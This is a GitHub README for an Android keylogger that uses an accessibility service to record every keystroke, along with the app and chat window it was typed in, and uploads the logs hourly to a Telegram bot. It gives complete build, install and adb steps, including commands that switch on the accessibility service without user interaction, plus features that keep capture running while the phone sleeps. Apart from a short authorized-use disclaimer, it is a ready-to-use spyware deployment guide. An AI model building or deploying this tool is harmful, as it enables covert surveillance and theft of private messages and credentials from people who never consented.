# ⌨️ Smart Keylogger (スマート・キーロガー) — Android → Telegram

> **Capture keystrokes on-device, upload the log file to your Telegram chat every hour. No server, no ports, no real-time spam.**

[![Platform](https://img.shields.io/badge/Platform-Android-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://www.android.com/)
[![Language](https://img.shields.io/badge/Language-Java-B07219?style=for-the-badge&logo=openjdk&logoColor=white)](https://www.java.com/)
[![Transport](https://img.shields.io/badge/Transport-Telegram%20Bot%20API-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://core.telegram.org/bots/api)
[![Server](https://img.shields.io/badge/Server-None%20Required-a6e3a1?style=for-the-badge)](https://github.com/Praveensenpai/Smart-Keylogger)

> [!WARNING]
> **Authorized use only.** This tool is for devices you own or have explicit written permission to test. Using it on anyone else's device is illegal in most jurisdictions.

---

## 🔄 How It Works

```text
┌──────────────────────────────┐
│  📱 Android device           │
│  AccessibilityService        │
│  · TEXT / CLICKED / FOCUSED  │
└──────────────┬───────────────┘
               │ append line
               ▼
┌──────────────────────────────┐
│  💾 Local storage            │
│  · keylog_YYYYMMDD.txt       │  ← adb pull anytime
│  · pending.txt               │
└──────────────┬───────────────┘
               │ every 60 min
               │ rename → outbox/
               ▼
┌──────────────────────────────┐
│  ☁️ Telegram Bot API         │
│  · sendDocument (multipart)  │
│  · delete file on HTTP 2xx   │
└──────────────┬───────────────┘
               ▼
┌──────────────────────────────┐
│  💬 Your Telegram chat       │
│  · keylog_20261108_221500.txt│
└──────────────────────────────┘
```

Each line records the timestamp, device, **which app**, **which screen/window**, the action, and the captured text:

```text
2026-11-09T14:22:01Z | Redmi Note 8 | WhatsApp | Chat with Alice | TEXT | hello world
```

Events are written to disk immediately. Once an hour the pending file is rotated into an `outbox/` folder and uploaded as a document attachment. Failed uploads stay queued and retry on the next cycle — nothing is lost while offline.

---

## ✨ Key Features

- **🎯 App + screen context** — every line records which app and which window/page the keystroke happened in
- **⏱️ Hourly file delivery** — one `sendDocument` per hour, not one message per keystroke
- **🔋 Doze-proof scheduling** — the hourly trigger is an `AlarmManager` `RTC_WAKEUP` broadcast, not a `Handler` timer, so it fires with the screen off and the phone asleep. Verified while the device reported `mWakefulness=Dozing`. A missed cycle is also caught up on the next user interaction, covering OEMs that throttle alarms.
- **📏 50 MB safe** — per-event text clipped to 500 chars, rotations split at 8 MB, and any file above 45 MB is parked as `*.failed` so it can never deadlock the queue
- **🧹 Self-pruning** — daily archives older than 7 days are deleted automatically
- **📴 Offline-first** — every event hits disk before any network call; queue survives reboots and flushes itself on the next alarm once the network is back
- **🔁 Retry-safe outbox** — files are deleted only after Telegram returns HTTP 2xx, so failures replay automatically
- **🗂️ Daily archives** — `keylog_YYYYMMDD.txt` kept separately for `adb pull`
- **📦 Zero server** — no Go daemon, no port forwarding, no local IP configuration
- **🔐 App-private storage** — writes go to `getExternalFilesDir()`, no storage permission needed
- **🛡️ No root required** — the launcher opens the accessibility screen; a one-line `adb` command arms it during testing
- **🔑 Credentials never committed** — token and chat id are injected at build time from gitignored `local.properties`

---

## ⚙️ Setup

### 1. Create a bot

Talk to [@BotFather](https://t.me/BotFather), run `/newbot`, and copy the token:

```
123456789:AAExampleTokenDoNotUseThisValue
```

### 2. Get your chat id

Send any message to your new bot (or add it to a group), then:

```bash
curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates" | grep -o '"chat":{"id":[-0-9]*'
```

### 3. Fill in the config

Credentials live in `AndroidKeylogger/local.properties` (gitignored, never committed):

```properties
sdk.dir=/path/to/Android/Sdk
TELEGRAM_BOT_TOKEN=123456789:AAExampleTokenDoNotUseThisValue
TELEGRAM_CHAT_ID=987654321
# Optional. Defaults to one hour. Use 60000 to test quickly.
TELEGRAM_UPLOAD_INTERVAL_MS=3600000
```

They are baked into `BuildConfig` at build time, so nothing secret ends up in the repo.

### 3b. Or skip the build: use the release APK

Release APKs are built by CI **without credentials**, so the token is never in a public artifact. Grab one from [Releases](https://github.com/Praveensenpai/Smart-Keylogger/releases/latest) and push a config file instead:

```bash
adb install -r smart-keylogger-2.1.apk

cat > telegram.conf <<'EOF'
bot_token=123456789:AAExampleTokenDoNotUseThisValue
chat_id=987654321
EOF

# Quote the path: it contains a colon.
adb push telegram.conf '/sdcard/Android/data/com.bshu2.androidkeylogger/files/'
```

Paths containing a colon (`/sdcard/Android/data/…`) must be quoted, e.g. `adb push telegram.conf '/sdcard/Android/data/…/files/'`.

The service reads `telegram.conf` on every start. Build-time values from `local.properties` always win when both exist. Delete the file after the first upload if you want it off the device: `adb shell rm /sdcard/Android/data/com.bshu2.androidkeylogger/files/telegram.conf`.

### 4. Build the APK

```bash
git clone https://github.com/Praveensenpai/Smart-Keylogger
cd Smart-Keylogger/AndroidKeylogger
./gradlew assembleDebug
# → app/build/outputs/apk/debug/app-debug.apk
```

Requires JDK 17. AGP 8.7.3 / Gradle 8.9 / compileSdk 35.

### 5. Install and arm

```bash
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

Launch the app once: it opens **Settings → Accessibility**, where you enable **AndroidKeylogger**. No root needed. For scripted testing over ADB:

```bash
adb shell "settings put secure enabled_accessibility_services com.bshu2.androidkeylogger/com.bshu2.androidkeylogger.Keylogger"
adb shell "settings put secure accessibility_enabled 1"
```

---

## 🧪 Verifying It Works

Force an early upload instead of waiting an hour:

```bash
# Watch the service logs
adb logcat -s Keylogger

# Inspect the queue and archives
adb shell ls -l /sdcard/Android/data/com.bshu2.androidkeylogger/files/
adb shell ls -l /sdcard/Android/data/com.bshu2.androidkeylogger/files/outbox/

# Pull a daily archive manually
adb pull /sdcard/Android/data/com.bshu2.androidkeylogger/files/keylog_$(date +%Y%m%d).txt
```

A successful cycle logs the Telegram response and the deletion:

```text
D Keylogger: sendDocument ok http=200 file=keylog_20261108_233401.txt bytes=725
D Keylogger: uploaded keylog_20261108_233401.txt
```

The file then disappears from `outbox/`. Any failure logs `sendDocument http=<code>` or the exception, and the file stays queued for the next cycle.

---

## 🛠️ Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| No files in chat | `BOT_TOKEN` / `CHAT_ID` still placeholders | Set both; `logcat` prints `BOT_TOKEN / CHAT_ID not set` |
| Upload fails | Bot never messaged, or wrong chat id | Send `/start` to the bot, re-check `getUpdates` |
| Nothing captured | Accessibility service disabled | Re-enable under Settings → Accessibility |
| Files pile up in `outbox/` | Device offline or Telegram blocked | They retry automatically; pull via `adb` meanwhile |

---

## 📜 License

MIT — see [LICENSE](LICENSE). Provided as-is, no warranty. Use only on devices you own or have explicit written permission to test.

---

<p align="center">Original concept by <a href="https://github.com/bshu2/Android-Keylogger">bshu2</a> · Telegram transport by <a href="https://www.youtube.com/channel/UC2O1Hfg-dDCbUcau5QWGcgg">Linuxndroid</a></p>
